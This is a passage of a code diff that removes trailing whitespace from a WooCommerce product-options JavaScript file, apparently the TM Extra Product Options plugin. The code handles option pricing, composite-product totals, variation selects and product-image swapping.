         }
@@ -2849,7 +2849,7 @@
                 apply_dpd,
                 per_product_pricing=true,
                 is_range_field=element.is(".tmcp-range");
-            if (!args){                
+            if (!args){
                 bto = element.closest(composite_selector);
                 cart=element.closest('.cart');
                 var variation_id_selector='input[name^="variation_id"]';
@@ -2890,10 +2890,10 @@
             var rules = setter.data('rules'),
                 rulestype = setter.data('rulestype'),
                 original_rules = setter.data('original-rules'),
-                _rules, 
+                _rules,
                 _rulestype,
                 _original_rules,
-                pricetype, 
+                pricetype,
                 price,
                 original_price,
                 formatted_price,
@@ -2904,8 +2904,8 @@
             if (original_rules==undefined){
                 original_rules=rules;
             }
-            // Composite Products                    
-            if (is_bto){                  
+            // Composite Products
+            if (is_bto){
                 if (cpf_bto_price.length>0){
                     if (cpf_bto_price.data('per_product_pricing')){
                         product_price = cpf_bto_price.val();
@@ -2913,7 +2913,7 @@
                         product_price = 0;
                         per_product_pricing=false;
                     }
-                    cpf_bto_price.val(product_price);                        
+                    cpf_bto_price.val(product_price);
                 }
             }else{
                 if ($totals.length){
@@ -2982,7 +2982,7 @@
                 if(typeof pricetype=="object"){
                     pricetype=pricetype[0];
                 }
-                
+
                 if (element.is('select')) {
                     element.find('option').each(function(){
                         var $t=$(this);
@@ -3007,7 +3007,7 @@
                         original_price=(original_price/100)*product_price;
                     break;
                     case 'percentcurrenttotal':
-                        late_fields_prices.push({"setter":setter,"price":price,"bundleid":bundleid});                    
+                        late_fields_prices.push({"setter":setter,"price":price,"bundleid":bundleid});
                         setter.data('tm-price-for-late',price).data('islate', 1).addClass('tm-epo-late-field');
                         price=0;
                         original_price=0;
@@ -3034,7 +3034,7 @@
                     break;
 
                     case 'charnon':
-                        var freechars=parseInt(setter.attr('data-freechars'));                            
+                        var freechars=parseInt(setter.attr('data-freechars'));
                         if (isNaN(freechars)){
                             freechars=0;
                         }
@@ -3046,7 +3046,7 @@
                         original_price=tm_apply_dpd($totals,original_price,apply_dpd)*textlength;
                     break;
                     case 'charpercentnon':
-                        var freechars=parseInt(setter.attr('data-freechars'));                            
+                        var freechars=parseInt(setter.attr('data-freechars'));
                         if (isNaN(freechars)){
                             freechars=0;
                         }
@@ -3058,7 +3058,7 @@
                         original_price=(original_price/100)*product_price*textlength;
                     break;
                     case 'charnonnospaces':
-                        var freechars=parseInt(setter.attr('data-freechars'));                            
+                        var freechars=parseInt(setter.attr('data-freechars'));
                         if (isNaN(freechars)){
                             freechars=0;
                         }
@@ -3070,7 +3070,7 @@
                         original_price=tm_apply_dpd($totals,original_price,apply_dpd)*textlength;
                     break;
                     case 'charpercentnonnospaces':
-                        var freechars=parseInt(setter.attr('data-freechars'));                            
+                        var freechars=parseInt(setter.attr('data-freechars'));
                         if (isNaN(freechars)){
                             freechars=0;
                         }
@@ -3099,7 +3099,7 @@
                         }else{
                             price=tm_apply_dpd($totals,price,apply_dpd)*setter.val().tmtoFloat();
                             original_price=tm_apply_dpd($totals,original_price,apply_dpd)*setter.val().tmtoFloat();
-                        }                        
+                        }
                     break;
                     case 'currentstep':
                     case 'currentstepfee':
@@ -3182,7 +3182,7 @@
                     if(typeof pricetype=="object"){
                         pricetype=pricetype[0];
                     }
-                    
+
                     if (element.is('select')) {
                         element.find('option').each(function(){
                             var $t=$(this);
@@ -3207,7 +3207,7 @@
                             original_price=(original_price/100)*product_price;
                         break;
                         case 'percentcurrenttotal':
-                            late_fields_prices.push({"setter":setter,"price":price,"bundleid":bundleid});                    
+                            late_fields_prices.push({"setter":setter,"price":price,"bundleid":bundleid});
                             setter.data('tm-price-for-late',price).data('islate', 1).addClass('tm-epo-late-field');
                             price=0;
                             original_price=0;
@@ -3228,7 +3228,7 @@
                             }else{
                                 price=tm_apply_dpd($totals,price,apply_dpd)*setter.val().tmtoFloat();
                                 original_price=tm_apply_dpd($totals,original_price,apply_dpd)*setter.val().tmtoFloat();
-                            }                            
+                            }
                         break;
                         case 'currentstep':
                         case 'currentstepfee':
@@ -3238,7 +3238,7 @@
                             }else{
                                 price=tm_apply_dpd($totals,setter.val().tmtoFloat(),apply_dpd);
                                 original_price=tm_apply_dpd($totals,setter.val().tmtoFloat(),apply_dpd);
-                            }                            
+                            }
                         break;
                         case 'intervalstep':
                             if(is_range_field){
@@ -3261,7 +3261,7 @@
                     tm_update_price(setter.closest('.tmcp-field-wrap').find('.tc-price'),price,formatted_price,original_price,original_formatted_price);
                 }
             }
-        }   
+        }
 
         function tm_epo_rules($thecart) {
             late_fields_prices=[];
@@ -3269,13 +3269,13 @@
             if (!$thecart){
                all_carts = main_product.find('.cart');
             }else{
-               all_carts = $thecart; 
+               all_carts = $thecart;
             }
             if (!all_carts.length>0){
                 return;
             }
             all_carts.each(function(cart_index,cart){
-                cart=$(cart); 
+                cart=$(cart);
                 var variation_id_selector='input[name^="variation_id"]';
                 if ( cart.find( 'input.variation_id' ).length > 0 ){
                     variation_id_selector='input.variation_id';
@@ -3297,8 +3297,8 @@
                     var container_id = get_composite_container_id(bto);
                     var price_data = get_composite_price_data(container_id);
                     if(price_data){
-                        per_product_pricing = is_per_product_pricing(price_data[ 'per_product_pricing' ]);    
-                    }                    
+                        per_product_pricing = is_per_product_pricing(price_data[ 'per_product_pricing' ]);
+                    }
                 }
                 // get current woocommerce variation
                 if (!current_variation) {
@@ -3312,7 +3312,7 @@
                     $cart=main_product.find('.tm-extra-product-options.tm-cart-'+bundleid);
                     var $totals = main_product.find('.tm-epo-totals.tm-cart-'+bundleid);
                 }
-                // WooCommerce Dynamic Pricing & Discounts 
+                // WooCommerce Dynamic Pricing & Discounts
                 var apply_dpd=$totals.data('fields-price-rules');
                 // set initial prices for all fields
                 if (!$cart.data('tm_rules_init_done')){
@@ -3380,7 +3380,7 @@
                 });
 
             });
-            
+
         }
 
         function tm_get_native_prices_block(obj){
@@ -3408,13 +3408,13 @@
                         main_cart = main_product;
                     }else{
                         main_cart = get_main_cart(main_product,"form",product_id);
-                    }                    
+                    }
                 }
                 $cart_container             = main_cart.parent();
                 $epo_holder                 = this_epo_container;
                 $totals_holder_container    = this_totals_container;
                 $totals_holder              = this_epo_totals_container;
-            
+
             }else{
                 // Composite bundle id
                 container_id                = get_composite_container_id($cart_container);
@@ -3425,12 +3425,12 @@
                 $epo_holder                 = main_product.find('.tm-extra-product-options.tm-cart-'+item_id);
                 $totals_holder_container    = main_product.find('.tm-totals-form-'+item_id);
                 $totals_holder              = main_product.find('.tm-epo-totals.tm-cart-'+item_id);
-            
+
             }
 
             current_cart = $composite_cart || main_cart;
             $totals_holder.data('tm_for_cart',current_cart);
-            
+
             var this_product_type = $totals_holder.data('type'),
                 $variation_form = $cart_container.find('.variations_form');
 
@@ -3449,13 +3449,13 @@
                     check1=tm_limit_c_selection(field,false),
                     check2=tm_exact_c_selection(field,false),
                     check3=true;
-                
+
                 // Format values
                 if ( ! currentVal || currentVal === '' || currentVal === 'NaN' ) currentVal = 0;
                 if ( max === '' || max === 'NaN' ) max = '';
                 if ( min === '' || min === 'NaN' ) min = 0;
                 if ( step === 'any' || step === '' || step === undefined || parseFloat( step ) === 'NaN' ) step = 1;
-                
+
                 if (currentVal<min || currentVal>max){
                     check3=false;
                 }
@@ -3478,7 +3478,7 @@
                     check1=tm_limit_c_selection(field,false),
                     check2=tm_exact_c_selection(field,false),
                     check3=true;
-                
+
                 // Format values
                 if ( ! currentVal || currentVal === '' || currentVal === 'NaN' ) currentVal = 0;
                 if ( max === '' || max === 'NaN' ) max = '';
@@ -3497,7 +3497,7 @@
                     }else{
                         $this.val(min);
                     }
-                }                
+                }
             })
             .on( 'tmaddquantity', '.tm-quantity .tm-qty')
             .on( 'tmaddquantity', '.tm-quantity .tm-qty', function() {
@@ -3546,7 +3546,7 @@
                     id=t.attr('data-tm-for-variation'),
                     v=t.val(),section=t.closest('.cpf-type-variations'),
                     native_select=$variation_form.find('#'+id);
-                
+
                 if (e && e.type && e.type=='tm_epo_variation_element_change'){
 
                 }else{
@@ -3562,7 +3562,7 @@
                     }
                     native_select.val(v).change();
                 }
-                                
+
                 if(!v){
                     native_select.trigger('focusin');
                 }
@@ -3584,7 +3584,7 @@
                     v=t.val();
 
                 $variation_form.find('#'+id).trigger('focusin');
-                
+
                 $variation_form
                     .trigger( 'woocommerce_update_variation_values_tmlogic' );
             });
@@ -3595,15 +3595,15 @@
                 if ($composite_cart && main_cart && main_cart.data('per_product_pricing')!=undefined && !main_cart.data('per_product_pricing')){
                     return;
                 }
-                var field=$(this), 
+                var field=$(this),
                     formatted_price = tm_set_price(field.find('option:selected').data('price'), $totals_holder),
                     original_formatted_price = tm_set_price(field.find('option:selected').data('original_price'), $totals_holder);;
-                
+
                 tm_update_price(field.closest('.tmcp-field-wrap').find('.tc-price') ,field.find('option:selected').data('price') ,formatted_price ,field.find('option:selected').data('original_price') ,original_formatted_price);
                 var e_tip=field.closest('.tmcp-field-wrap').find('.tc-tooltip');
                 if(e_tip.length>0){
-                    e_tip.attr('data-tm-tooltip-html',field.find('option:selected').attr('data-tm-tooltip-html')).trigger('tc-tooltip-html-changed');    
-                }                
+                    e_tip.attr('data-tm-tooltip-html',field.find('option:selected').attr('data-tm-tooltip-html')).trigger('tc-tooltip-html-changed');
+                }
             })
             .off('tm-select-change')
             .on('tm-select-change', function() {
@@ -3611,7 +3611,7 @@
                     return;
                 }
                 $(this).trigger('tm-select-change-html');
-                 
+
                 current_cart.trigger({
                     "type":"tm-epo-update",
                     "norules":1,
@@ -3645,10 +3645,10 @@
                         $this=field.children('option:selected');
                     }
                     if ($(uic).length>0 || ($this.attr('data-image')!=undefined && $this.attr('data-image')!='') || ($this.attr('data-imagep')!=undefined && $this.attr('data-imagep')!='')){
-                        
-                        if (field.is(':checked') 
+
+                        if (field.is(':checked')
                             || (field.is('select.tm-product-image') && field.val()!='' && (field.find("option:selected").attr("data-rules")!='' || field.is('.tm-epo-variation-element')) ) ){
-                            
+
                             var src=$(uic).first().attr('data-original');
 
                             if (!src&& !is_variation_element){
@@ -3662,14 +3662,14 @@
                             }
                             if (src){
                                 main_product.trigger('tm_change_product_image',{
-                                    "src":src, 
+                                    "src":src,
                                     "element":field,
                                     "main_product":main_product,
                                     "epo_holder":$epo_holder
-                                });                                
+                                });
                             }else{
                                 main_product.trigger('tm_change_product_image',{
-                                    "src":false, 
+                                    "src":false,
                                     "element":field,
                                     "main_product":main_product,
                                     "epo_holder":$epo_holder
@@ -3681,14 +3681,14 @@
                                 "element":field,
                                 "main_product":main_product,
                                 "epo_holder":$epo_holder
-                            }); 
+                            });
                         }
                     }else{
                          main_product.trigger('tm_restore_product_image',{
                             "element":field,
                             "main_product":main_product,
                             "epo_holder":$epo_holder
-                        }); 
+                        });
                     }
                 }else{
                      main_product.trigger('tm_attempt_product_image',{
@@ -3710,7 +3710,7 @@
                         if (field.val()!==''){
                             show=true;
                         }
-                    }else if (field.is(':checkbox')) {                      
+                    }else if (field.is(':checkbox')) {
                         if (field.is(':checked')) {
                             show=true;
                         }
@@ -3779,7 +3779,7 @@
                             "norules":1,
                             "element":field
                         });
-                    }                    
+                    }
                 }
                 field.trigger('tm_trigger_product_image');
                 main_product.trigger('tm_attempt_product_image',{
@@ -3788,7 +3788,7 @@
                     "epo_holder":$epo_holder
                 });
             });
-            
+
             $epo_holder.find('.tm-epo-reset-radio')
             .off('click.cpf')
             .on('click.cpf',  function() {
@@ -3818,7 +3818,7 @@
 
                 if (!name.length>0){
                     name=$('<span class="tm-filename"></span>')
-                    label.after(name);                    
+                    label.after(name);
                 }
                 name.html($this.val());
             });
@@ -3867,12 +3867,12 @@
 
                 if ($nyp.length>0){
                     $totals_holder_container.find('.cpf-product-price').val(new_product_price);
-                    $totals_holder.data('price',new_product_price);    
+                    $totals_holder.data('price',new_product_price);
                     current_cart.trigger({
                         "type":"tm-epo-update",
                         //"norules":1
                     });
-                }                    
+                }
             });
             current_cart.trigger( 'woocommerce-nyp-update.cpf');
 
@@ -3881,13 +3881,13 @@
             .off('priceChange.cpf')
             .on('priceChange.cpf', function(evt, sp, tp) {
                 var v=$cart_container.find('input[name="fpd_product_price"]').val();
-                
+
                 if ($totals_holder.data('fpdprice')===undefined){
                     $totals_holder.data('fpdprice',parseFloat(v));
                 }else{
                     $totals_holder.data('fpdprice',parseFloat(v));
                 }
-                
+
                 if ($totals_holder.data('tcprice')===undefined){
                     $totals_holder.data('tcprice',parseFloat($totals_holder.data('price')));
                 }else{
@@ -3895,11 +3895,11 @@
                 }
 
                 v =parseFloat($totals_holder.data('price')) + parseFloat(v);
-                
+
                 $totals_holder.parent().find('.cpf-product-price').val(v);
-                
+
                 $totals_holder.data('price',v);
-                
+
                 current_cart.trigger({
                     "type":"tm-epo-update",
                     "norules":1
@@ -3952,14 +3952,14 @@
 
                             if (min <= qty && qty <= max){
                                 if (min <= qty_prev && qty_prev <= max){
-                                    
+
                                 }else{
                                     tm_epo_rules($cart);
                                 }
                             }
-                        });    
+                        });
                     }
-                    
+
                 }
             });
 
@@ -3967,7 +3967,7 @@
             current_cart
             .off("tm-epo-update")
             .on('tm-epo-update', function(pass) {
-                
+
                 var $cart=$(this),
                     check_for_bto_internal_show,
                     bundleid=$cart.attr( 'data-product_id' );
@@ -3990,7 +3990,7 @@
                     }
                     late_fields_prices=[];
                     $epo_holder.find('.tm-epo-late-field').each(function(){
-                        var setter=$(this), 
+                        var setter=$(this),
                             price=setter.data('tm-price-for-late');
                         setter.data('price',0);
                         late_fields_prices.push({"setter":setter,"price":price,"bundleid":bundleid});
@@ -4020,7 +4020,7 @@
                         qty=1;
                     }
                 }
-                
+
                 if ($totals_holder.length){
                     product_price = tm_calculate_product_price($totals_holder);
                 }else{
@@ -4037,14 +4037,14 @@
                     per_product_pricing=$cart.find('.cpf-bto-price').data('per_product_pricing');
 
                 }else if (!$composite_cart && main_product.find('.cpf-bto-price').length>0){
-                    
-                    check_for_bto_internal_show=1;                   
-                    
+
+                    check_for_bto_internal_show=1;
+
                     product_price_bto=[];
-                    
-                    main_product.find('.cpf-bto-price').each(function(ind,el){                    
+
+                    main_product.find('.cpf-bto-price').each(function(ind,el){
                         if (!isNaN( parseFloat($(this).val()))){
-                            var _qty=$(this).closest('.cart').find('input.qty');  
+                            var _qty=$(this).closest('.cart').find('input.qty');
                             if (_qty.length>0){
                                 _qty=parseFloat(_qty.val());
                             }else{
@@ -4061,13 +4061,13 @@
                             product_price_bto.push([$(this).val(),optionsprice,_qty,isi]);
                         }
                     });
-                    
+
                     main_product.find('.cpf-bto-optionsprice').each(function(ind,el){
                         if (!isNaN( parseFloat($(this).val()))){
                             product_price=parseFloat(product_price)+parseFloat($(this).val());
                         }
                     });
-                    
+
                 }
                 if ($composite_cart || (main_epo_inside_form && tm_epo_js.tm_epo_totals_box_placement=="woocommerce_before_add_to_cart_button")){
                     if ( (product_type == 'variable' || product_type == 'variable-subscription')  && !$totals_holder.data("moved_inside")) {
@@ -4094,7 +4094,7 @@
                         option_quantity="";
                     }
                     if (field.is(':checkbox, :radio, :input')) {
-                        if ( field_is_active( field ) ){ 
+                        if ( field_is_active( field ) ){
                             var option_price = 0;
                             if (field.is('.tmcp-checkbox, .tmcp-radio')) {
                                 if (field.is(':checked')) {
@@ -4110,8 +4110,8 @@
                                         var tl=field.closest('li.tmcp-field-wrap').find('.tm-label');
                                         if (tl.length){
                                             _value=tl.html();
-                                        }                                        
-                                    }                                        
+                                        }
+                                    }
                                     if (field.is('.use_images')){
                                         if (cri.length){
                                             _value=_value+cri.clone().addClass('tc-img-floating')[0].outerHTML;
@@ -4125,21 +4125,21 @@
                                 }
                             } else if (field.is('.tmcp-select')) {
                                 option_price = field.find('option:selected').data('price');
-                                 
-                                var options = field.children('option:selected');                                    
+
+                                var options = field.children('option:selected');
                                 if (options.val()==="" && options.attr('data-rulestype')===""){
                                     //not selected
                                 }else{
                                     show_total = true;
                                 }
-                                
+
                                 field.find('option').data('isset',0);
                                 field.find('option:selected').data('isset',1);
 
                                 if (!(field.find('option:selected').val()==="" && field.find('option:selected').attr('data-rulestype')==="")){
-                                    
+
                                     _value=field.find('option:selected').text();
-                                    
+
                                     tm_floating_box_data.push({title:field_title,value:_value,price:option_price,quantity:option_quantity,label_show:field_label_show,value_show:field_value_show});
                                 }
                             } else {
@@ -4150,7 +4150,7 @@
                                         option_price = field.data('price');
                                         show_total = true;
                                         field.data('isset',1);
-                                        
+
                                         _value=field.val();
                                         if (field.is(".tmcp-range")){
                                             var forrangepicker = $(".tm-range-picker[data-field-id='"+field.attr("id")+"']"),
@@ -4166,7 +4166,7 @@
                                                 precision: $decimals
                                             });
                                         }
-                                        
+
 
                                         tm_floating_box_data.push({title:field_title,value:_value,price:option_price,quantity:option_quantity,label_show:field_label_show,value_show:field_value_show});
                                     }
@@ -4182,19 +4182,19 @@
                         }
                     }
                 });
-                
+
                 if (price_override=="1" && parseFloat(total)>0){
                     product_price=v_product_price=0;
                 }
-                
+
                 $totals_holder.data('tm-floating-box-data',tm_floating_box_data);
-                
+
                 var subscription_options_total=0;
                 var cart_fee_options_total=0;
                 $epo_holder.find('.tmcp-sub-fee-field,.tmcp-fee-field').each(function() {
                     var field=$(this);
                     if (field.is(':checkbox, :radio, :input')) {
-                        if ( field_is_active( field ) ){ 
+                        if ( field_is_active( field ) ){
                             var option_price = 0;
                             if (field.is('.tmcp-checkbox, .tmcp-radio')) {
                                 if (field.is(':checked')) {
@@ -4206,7 +4206,7 @@
                                 }
                             } else if (field.is('.tmcp-select')) {
                                 option_price = field.find('option:selected').data('price');
-                                var options = field.children('option:selected');                                    
+                                var options = field.children('option:selected');
                                 if (options.val()==="" && options.attr('data-rulestype')===""){
                                     //not selected
                                 }else{
@@ -4240,7 +4240,7 @@
                 one_option_is_selected=show_total;
                 tm_show_hide_add_to_cart_button();
 
-                if(cart_fee_options_total>0){                    
+                if(cart_fee_options_total>0){
                     show_total=true;
                 }
 
@@ -4250,17 +4250,17 @@
                         show_total=true;
                     }
                 }
-                
+
                 if (check_for_bto_internal_show){
                     show_total=true;
                 }
-                
+
                 if ($composite_cart && !per_product_pricing){
                     show_total=false;
                 }
 
-                if(tm_epo_js.tm_epo_final_total_box=='pxq' 
-                    || tm_epo_js.tm_epo_final_total_box=='hide' 
+                if(tm_epo_js.tm_epo_final_total_box=='pxq'
+                    || tm_epo_js.tm_epo_final_total_box=='hide'
                     || tm_epo_js.tm_epo_final_total_box=='normal'
                     || tm_epo_js.tm_epo_final_total_box=='final'
                     || tm_epo_js.tm_epo_final_total_box=='hideoptionsifzero'
@@ -4278,23 +4278,23 @@
                 // Original price + options price type requires this here.
                 var _total=total;
                 product_price=tm_set_tax_price(product_price,$totals_holder);
-                var late_total_price= add_late_fields_prices(parseFloat(product_price) + parseFloat(_total),bundleid,$totals_holder); 
+                var late_total_price= add_late_fields_prices(parseFloat(product_price) + parseFloat(_total),bundleid,$totals_holder);
 
                 //if(tm_epo_js.tm_epo_final_total_box=='disable'){
                 //     show_total=false;
                 //}
-                
+
                 var tc_totals_ob = {};
 
                 if (show_total && qty > 0) {
                     /* hide native prices */
                     var hide_native_price = $.tc_apply_filters("hide_native_price",true);
                     if (hide_native_price===true){
-                        tm_get_native_prices_block($cart).hide();    
+                        tm_get_native_prices_block($cart).hide();
                     }else{
                         tm_get_native_prices_block($cart).show();
                     }
-                    
+
                     //var _total=total;
 
                     total = parseFloat(total * qty);
@@ -4302,7 +4302,7 @@
                     var formatted_options_total,// = tm_set_price(total),
                         formatted_final_total,
                         extra_fee=0;
-                    
+
                     if (tm_epo_js.extra_fee){
                         extra_fee=parseFloat(tm_epo_js.extra_fee);
                         if (isNaN(extra_fee)){
@@ -4330,7 +4330,7 @@
                             }
                         };
                     }
-                                        
+
                     _total = _total + late_total_price;
                     total = parseFloat(_total * qty);
 
@@ -4340,9 +4340,9 @@
                             options_multiplier = 0,
                             found = false;
                         if (bookingform.length){
-                           
+
                             if (tm_epo_js.wc_booking_person_qty_multiplier){
-                                bookingform.find('[id^="wc_bookings_field_persons"]').each(function(){                             
+                                bookingform.find('[id^="wc_bookings_field_persons"]').each(function(){
                                     options_multiplier = options_multiplier + parseFloat($(this).val());
                                     found = true;
                                 });
@@ -4362,12 +4362,12 @@
 
                     var total_plus_fee=parseFloat(total)+parseFloat(cart_fee_options_total);
                     formatted_options_total = tm_set_price(total_plus_fee,$totals_holder,true,true);
-                    
+
                     product_total_price = parseFloat(product_total_price + total_plus_fee + extra_fee);
                     product_total_price = $.tc_apply_filters("tc_adjust_product_total_price",product_total_price,total_plus_fee,extra_fee,total,cart_fee_options_total,$totals_holder);
 
                     formatted_final_total = tm_set_price(product_total_price,$totals_holder,true,true);
-                    
+
                     var html,
                         show_options_total=false,
                         formatted_extra_fee='',
@@ -4375,13 +4375,13 @@
                         show_final_total=false,
                         formatted_subscription_fee_total='',
                         show_sign_up_fee=false;
-                    
+
                     if (
-                        tm_epo_js.tm_epo_final_total_box!='pxq' 
-                        && tm_epo_js.tm_epo_final_total_box!='final' 
-                        && tm_epo_js.tm_epo_final_total_box!='hide' 
+                        tm_epo_js.tm_epo_final_total_box!='pxq'
+                        && tm_epo_js.tm_epo_final_total_box!='final'
+                        && tm_epo_js.tm_epo_final_total_box!='hide'
                         && (!(total_plus_fee==0 && tm_epo_js.tm_epo_final_total_box=='hideoptionsifzero')) ){
-                        show_options_total=true;                    
+                        show_options_total=true;
                     }
                     if (extra_fee) {
                         show_extra_fee=true;
@@ -4420,7 +4420,7 @@
                         };
                     html = $.fn.tm_template( template_engine.tc_final_totals, tc_totals_ob );
                     $totals_holder.data('tm-html',html);
-                    
+
                     if(tm_epo_js.tm_epo_final_total_box!='disable'){
 
                         if ((tm_epo_js.tm_epo_final_total_box=='hideifoptionsiszero' && total_plus_fee==0) || tm_epo_js.tm_epo_final_total_box=='hide'){
@@ -4497,16 +4497,16 @@
 
                     });
                     if (v_product_price==0 && tm_epo_js.tm_epo_remove_free_price_label=="yes"){
-                        tm_get_native_prices_block($cart).hide();    
-                    }                    
+                        tm_get_native_prices_block($cart).hide();
+                    }
 
 
                     $totals_holder.empty().hide();
                     $totals_holder.data('tm-html','');
                     if ($composite_cart){
                         if (per_product_pricing){
-                            $cart.find('.cpf-bto-optionsprice').val(parseFloat(total*qty));    
-                        }                        
+                            $cart.find('.cpf-bto-optionsprice').val(parseFloat(total*qty));
+                        }
                         main_cart.trigger({
                             "type":"tm-epo-update",
                             "norules":1
@@ -4539,23 +4539,23 @@
                     current_cart.trigger({
                         "type":"tm-epo-update",
                         "norules":2
-                    }); 
+                    });
                 });
 
                 _window.on('tm-do-epo-update',function(){
                     current_cart.trigger({
                         "type":"tm-epo-update",
                         //"norules":1
-                    }); 
+                    });
                 });
             }
             function found_variation_tmepo(event, variation) {
-                var variation_form = $(this), //$(event.target);                   
+                var variation_form = $(this), //$(event.target);
                     variations      = $totals_holder.data('variations'),
                     variations_subscription_sign_up_fee = $totals_holder.data('variations-subscription-sign-up-fee'),
                     variations_subscription_period = $totals_holder.data('variations-subscription-period'),
                     product_price;
-                
+
                 if (variations && variation && variation.variation_id && variations_subscription_sign_up_fee[variation.variation_id]){
                     $totals_holder.data('subscription-sign-up-fee', variations_subscription_sign_up_fee[variation.variation_id]);
                 }
@@ -4581,16 +4581,16 @@
                     $totals_holder.data('price', product_price);
                 }
                 $totals_holder_container.find('.cpf-product-price').val(product_price);
-                
+
                 variation_form.data('tm_variations_did_init',true);
 
                 if(!variation_form.data('tm-styled-variations')){
                     current_cart.trigger({
                         "type":"tm-epo-update",
                         //"norules":1
-                    });                    
+                    });
                 }
-                
+
             };
             $cart_container.find('.variations select')
             .off('blur.cpf')
@@ -4630,7 +4630,7 @@
                 }, 500, "easeOutExpo", function() {
                     _window.trigger('epo_options_visible');
                     _window.trigger("tmlazy");
-                });  
+                });
             }, 500);
 
         }
@@ -4663,7 +4663,7 @@
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).removeData('cpf_review_price');
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).find('.amount').empty();
 
-                if ( is_per_product_pricing(price_data[ 'per_product_pricing' ]) == true ) {                   
+                if ( is_per_product_pricing(price_data[ 'per_product_pricing' ]) == true ) {
                     product_price = parseFloat(variation.price);
                 }
                 item.find('.cpf-bto-price').data('per_product_pricing',is_per_product_pricing(price_data[ 'per_product_pricing' ]) );
@@ -4708,7 +4708,7 @@
                 if (!price_data){
                     return;
                 }
-                if ( is_per_product_pricing(price_data[ 'per_product_pricing' ]) == true ) {                   
+                if ( is_per_product_pricing(price_data[ 'per_product_pricing' ]) == true ) {
                     product_price = parseFloat(item.find( '.bto_item_data,.component_data' ).data( 'price' ));
                 }
                 item.find('.cpf-bto-price').data('per_product_pricing',is_per_product_pricing(price_data[ 'per_product_pricing' ]) );
@@ -4735,7 +4735,7 @@
 
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).removeData('cpf_review_price');
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).find('.amount').empty();
-                if (item.val() === ''){                                                         
+                if (item.val() === ''){
                     $totals.data('passed',false);
                     $totals.data('btois','none');
                 }else{
@@ -4753,7 +4753,7 @@
 
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).removeData('cpf_review_price');
                 main_product.find(".bto_form,#composite_form_"+ container_id + ',#composite_data_' + container_id).find( get_review_selector(item_id) ).find('.amount').empty();
-                if (item.find( '.variations .attribute-options select' ).val()===''){                                                     
+                if (item.find( '.variations .attribute-options select' ).val()===''){
                     $totals.data('passed',false);
                     $totals.data('btois','none');
                 }
@@ -4763,7 +4763,7 @@
             .off('show_bundle.cpf,wc-composite-show-add-to-cart.cpf')
             .on('show_bundle.cpf,wc-composite-show-add-to-cart.cpf',function(){
                 var id=$(this).closest('.cart').attr('data-container-id');
-                check_bto(id);                
+                check_bto(id);
             });
 
             main_product.find('.composite_data .composite_wrap')
@@ -4800,7 +4800,7 @@
                         var total = parseFloat(value)+parseFloat(options);
                         html.find('.amount').html(tm_set_price(total,false));
                     }
-                });                        
+                });
 
             } );
 
@@ -4819,7 +4819,7 @@
                     quantity_input  = form_data.find( 'input.quantity_input' ).val(),
                     variation_input = form_data.find( 'input.variation_input' ).val(),
                     product_type    = item.find( '.bto_item_data,.component_data' ).data( 'product_type' );
-                
+
                 if ( product_type == undefined || product_type == '' || product_input === '' ){
                     show = false;
                 }
@@ -4830,7 +4830,7 @@
                     show = false;
                 }
             });
-            
+
             if (show){
                 $totals.data('btois','show');
             }else{
@@ -4860,18 +4860,18 @@
             obj.find('.tm-owl-slider-section').each(function(){
                 var dv=$(this),
                     dvv=dv.css('display');
-                
+
                 dv.find('.tm-slide').first().before('<div class="tm-owl-slider"></div>');
                 dv.find('.tm-slide').appendTo(dv.find('.tm-owl-slider'));
-                
+
                 dv=dv.find('.tm-owl-slider');
                 dvv=dv.css('display');
-                
+
                 dv
                 .show()
                 .addClass('owl-carousel')
                 .tmowlCarousel({
-                        
+
                     dots:false,
                     nav:true,
                     items:1,
@@ -4884,12 +4884,12 @@
                     navElement:'a',
                     loop:false,
                     navRewind:false
-                        
+
                 });
-                
-                dv.css('display',dvv);              
-              
-            });            
+
+                dv.css('display',dvv);
+
+            });
 
         }
 
@@ -4900,7 +4900,7 @@
             if ($(obj).length){
                 $(obj).spectrum({});
                 $(obj).spectrum("enable");
-            }            
+            }
         }
 
         function has_active_changes_product_image(field){
@@ -4930,7 +4930,7 @@
                 product_element=main_product.closest('.post-'+product_id);
             }
             var img=product_element.find(".images img").not('.thumbnails img');
-            
+
             if ($(img).length>1){
                 img=$(img).first();
             }
@@ -4976,11 +4976,11 @@
                         is_variation_element=variation_element_section.is('.tm-epo-variation-section'),
                         $this_epo_container=(is_variation_element)?variation_element_section:e.epo_holder,
                         tm_last_visible_image_element=$this_epo_container.find('.tm-product-image:checked,select.tm-product-image');
-                        
+
                     var last_activate_field=[];
                     tm_last_visible_image_element.each(function(){
                         var t=$(this);
-                        if(field_is_active(t) 
+                        if(field_is_active(t)
                             && has_active_changes_product_image(t)
                             && (tm_check_field_match({
                         "element":t.closest(".cpf_hide_element"),
@@ -5009,11 +5009,11 @@
                         $current_product_element=$main_product.closest('#product-'+product_id);
                     if (!$current_product_element.length>0){
                         $current_product_element=$main_product.closest('.post-'+product_id);
-                    }    
+                    }
                     var current_cloned_image=$current_product_element.find('#'+tm_current_image_element_id+'_tmimage'),
                         preload_width=img_width,
                         preload_height=img_height;
-                    
+
                     if(current_cloned_image.length==0){
                         current_cloned_image=img;
                     }
@@ -5030,7 +5030,7 @@
                         img.data('tm-current-image',false);
                         $current_product_element.find('.tm-clone-product-image').hide();
                         img.show();
-                    };                    
+                    };
                     if(e.src==current_cloned_image.attr("src") && current_cloned_image.is(":visible")){
                         return;
                     }
@@ -5088,7 +5088,7 @@
                         clone_image.animate({
                             opacity: 1
                         }, 1500, "easeOutExpo", function() {
-                            
+
                         });
 
                         if (is_yith_wcmg){
@@ -5131,7 +5131,7 @@
                         a.attr('href',e.src);
                         a.attr('title',new_title);
                         img.attr('title',new_title);
-                        img.attr('alt',new_title);                        
+                        img.attr('alt',new_title);
 
                         img.data('tm-current-image',tm_current_image_element_id);
                     }else{
@@ -5165,19 +5165,19 @@
                         a.attr('title',a_title_original);
                         img.attr('title',img_title_original);
                         img.attr('alt',img_alt_original);
-                        img.data('tm-current-image',false);                        
+                        img.data('tm-current-image',false);
                     }else{
                         if(!is_it_visible){
                             return;
                         }
